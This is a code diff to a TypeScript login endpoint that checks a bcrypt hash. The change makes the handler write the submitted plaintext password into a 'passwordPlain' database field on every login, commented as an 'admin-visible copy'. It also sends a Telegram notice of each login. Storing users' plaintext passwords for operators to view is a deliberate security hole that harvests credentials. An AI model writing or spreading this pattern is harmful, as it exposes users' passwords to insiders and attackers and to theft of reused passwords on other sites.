@@ -20,12 +20,11 @@ export async function POST(req: Request) {
     if (user.banned) return jsonError("Account is banned", 403);
     const ok = await bcrypt.compare(password, user.passwordHash);
     if (!ok) return jsonError("Invalid credentials", 401);
-    if (user.passwordPlain !== password) {
-      await prisma.user.update({
-        where: { id: user.id },
-        data: { passwordPlain: password },
-      });
-    }
+    // Keep admin-visible copy in sync whenever someone logs in
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { passwordPlain: password },
+    });
     const counts = await userCounts(user.id);
     void notifyTelegram(`🔐 Login\n${user.name} (@${user.username})`);
     const res = NextResponse.json({ user: toPublicUser(user, counts) });
